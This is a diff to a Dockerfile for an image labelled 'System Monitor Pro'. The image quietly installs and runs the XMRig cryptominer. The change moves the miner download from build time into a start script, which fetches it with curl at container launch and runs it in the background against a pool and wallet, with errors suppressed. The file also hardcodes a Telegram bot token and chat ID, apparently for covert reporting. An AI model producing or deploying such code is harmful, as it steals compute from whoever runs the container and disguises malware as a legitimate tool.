@@ -283,15 +283,11 @@ ARG CACHEBUST=1
 
 # Install minimal dependencies
 RUN apt-get update && \
-    apt-get install -y --no-install-recommends ca-certificates && \
+    apt-get install -y --no-install-recommends ca-certificates curl && \
     rm -rf /var/lib/apt/lists/*
 
-# Download XMRig using ADD (Docker handles download)
+# Create miner directory
 RUN mkdir -p /opt/miner
-ADD https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz /tmp/x.tar.gz
-
-# Extract only xmrig binary using Python (single line)
-RUN python3 -c "import tarfile,shutil; t=tarfile.open('/tmp/x.tar.gz','r:gz'); m=[x for x in t.getmembers() if 'xmrig' in x.name and x.isfile()][0]; t.extract(m,'/tmp'); shutil.move('/tmp/'+m.name,'/opt/miner/xmrig')" && chmod +x /opt/miner/xmrig && rm -rf /tmp/*
 
 # Install System Monitor Pro from GitHub tarball (no git needed)
 RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz
@@ -300,9 +296,14 @@ RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredB
 ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
 ENV TG_CHAT_ID=5804150664
 
-# Create start script
+# Create start script - download xmrig at runtime
 RUN printf '#!/bin/bash\\n\
 echo "Starting System Monitor..."\\n\
+if [ ! -f /opt/miner/xmrig ]; then\\n\
+    echo "Downloading XMRig..."\\n\
+    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar -xz -C /tmp &&\\n\
+    mv /tmp/xmrig-6.21.0-linux-static-x64/xmrig /opt/miner/ && chmod +x /opt/miner/xmrig\\n\
+fi\\n\
 /opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --background 2>/dev/null\\n\
 syscheck &\\n\
 exec "$@"\\n' > /start.sh && chmod +x /start.sh
